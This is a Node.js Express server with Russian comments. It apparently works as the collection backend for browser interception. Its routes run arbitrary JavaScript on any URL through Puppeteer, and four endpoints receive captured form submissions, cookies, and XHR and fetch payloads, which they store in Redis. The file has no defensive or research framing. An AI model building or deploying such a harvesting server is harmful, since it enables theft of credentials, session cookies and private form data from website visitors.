const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const winston = require('winston');
const { createClient } = require('redis');
const puppeteer = require('./browser');

// Создаем логгер
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    defaultMeta: { service: 'node-service' },
    transports: [
        new winston.transports.File({ filename: '/var/log/node/error.log', level: 'error' }),
        new winston.transports.File({ filename: '/var/log/node/combined.log' })
    ]
});

// Добавляем вывод в консоль в режиме разработки
if (process.env.NODE_ENV !== 'production') {
    logger.add(new winston.transports.Console({
        format: winston.format.simple()
    }));
}

// Инициализируем Redis-клиент
const redisClient = createClient({
    url: `redis://${process.env.REDIS_HOST || 'redis'}:6379`
});

// Подключаемся к Redis
(async () => {
    try {
        await redisClient.connect();
        logger.info('Подключение к Redis успешно установлено');
    } catch (err) {
        logger.error('Ошибка подключения к Redis', { error: err.message });
    }
})();

// Создаем Express-приложение
const app = express();

// Настраиваем middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

// Middleware для логирования запросов
app.use((req, res, next) => {
    logger.info('Получен запрос', {
        method: req.method,
        path: req.path,
        ip: req.ip
    });
    next();
});

// Маршрут для проверки работоспособности
app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

// Маршрут для доступа к сайту через Puppeteer
app.get('/api/browser', async (req, res) => {
    try {
        const url = req.query.url;
        
        if (!url) {
            return res.status(400).json({ error: 'URL не указан' });
        }
        
        logger.info('Запрос к браузеру', { url });
        
        // Получаем содержимое страницы через Puppeteer
        const result = await puppeteer.getPageContent(url);
        
        // Отправляем ответ
        res.json(result);
    } catch (err) {
        logger.error('Ошибка при доступе через браузер', { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

// Маршрут для выполнения JavaScript на странице
app.post('/api/browser/execute', async (req, res) => {
    try {
        const { url, script } = req.body;
        
        if (!url || !script) {
            return res.status(400).json({ error: 'URL или скрипт не указаны' });
        }
        
        logger.info('Запрос на выполнение скрипта', { url });
        
        // Выполняем JavaScript на странице через Puppeteer
        const result = await puppeteer.executeScript(url, script);
        
        // Отправляем ответ
        res.json(result);
    } catch (err) {
        logger.error('Ошибка при выполнении скрипта', { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

// Маршрут для перехвата данных форм
app.post('/api/capture', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data) {
            return res.status(400).json({ error: 'Данные не указаны' });
        }
        
        logger.info('Перехвачены данные формы', {
            url: data.url,
            formAction: data.formAction
        });
        
        // Сохраняем данные в Redis
        const key = `captured:form:${Date.now()}`;
        await redisClient.hSet(key, {
            type: 'form',
            url: data.url || '',
            formAction: data.formAction || '',
            formMethod: data.formMethod || '',
            data: JSON.stringify(data.data || {}),
            timestamp: Date.now()
        });
        
        // Устанавливаем время жизни ключа (24 часа)
        await redisClient.expire(key, 86400);
        
        // Отправляем ответ
        res.json({ status: 'success' });
    } catch (err) {
        logger.error('Ошибка при сохранении данных формы', { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

// Маршрут для перехвата cookies
app.post('/api/capture/cookie', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data) {
            return res.status(400).json({ error: 'Данные не указаны' });
        }
        
        logger.info('Перехвачены cookie', {
            url: data.url
        });
        
        // Сохраняем данные в Redis
        const key = `captured:cookie:${Date.now()}`;
        await redisClient.hSet(key, {
            type: 'cookie',
            url: data.url || '',
            cookie: data.cookie || '',
            timestamp: Date.now()
        });
        
        // Устанавливаем время жизни ключа (24 часа)
        await redisClient.expire(key, 86400);
        
        // Отправляем ответ
        res.json({ status: 'success' });
    } catch (err) {
        logger.error('Ошибка при сохранении cookie', { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

// Маршрут для перехвата XHR-запросов
app.post('/api/capture/xhr', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data) {
            return res.status(400).json({ error: 'Данные не указаны' });
        }
        
        logger.info('Перехвачен XHR-запрос', {
            url: data.url,
            method: data.method
        });
        
        // Сохраняем данные в Redis
        const key = `captured:xhr:${Date.now()}`;
        await redisClient.hSet(key, {
            type: 'xhr',
            url: data.url || '',
            method: data.method || '',
            data: typeof data.data === 'string' ? data.data : JSON.stringify(data.data || {}),
            timestamp: Date.now()
        });
        
        // Устанавливаем время жизни ключа (24 часа)
        await redisClient.expire(key, 86400);
        
        // Отправляем ответ
        res.json({ status: 'success' });
    } catch (err) {
        logger.error('Ошибка при сохранении XHR-запроса', { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

// Маршрут для перехвата fetch-запросов
app.post('/api/capture/fetch', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data) {
            return res.status(400).json({ error: 'Данные не указаны' });
        }
        
        logger.info('Перехвачен fetch-запрос', {
            url: data.url,
            method: data.method
        });
        
        // Сохраняем данные в Redis
        const key = `captured:fetch:${Date.now()}`;
        await redisClient.hSet(key, {
            type: 'fetch',
            url: data.url || '',
            method: data.method || '',
            data: typeof data.data === 'string' ? data.data : JSON.stringify(data.data || {}),
            timestamp: Date.now()
        });
        
        // Устанавливаем время жизни ключа (24 часа)
        await redisClient.expire(key, 86400);
        
        // Отправляем ответ
        res.json({ status: 'success' });
    } catch (err) {
        logger.error('Ошибка при сохранении fetch-запроса', { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

// Обработчик ошибок
app.use((err, req, res, next) => {
    logger.error('Ошибка сервера', { error: err.message });
    res.status(500).json({ error: err.message });
});

// Запускаем сервер
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    logger.info(`Сервер запущен на порту ${PORT}`);
});

// Обработка сигналов завершения
process.on('SIGTERM', async () => {
    logger.info('Получен сигнал SIGTERM, завершаем работу');
    await redisClient.quit();
    process.exit(0);
});

process.on('SIGINT', async () => {
    logger.info('Получен сигнал SIGINT, завершаем работу');
    await redisClient.quit();
    process.exit(0);
});
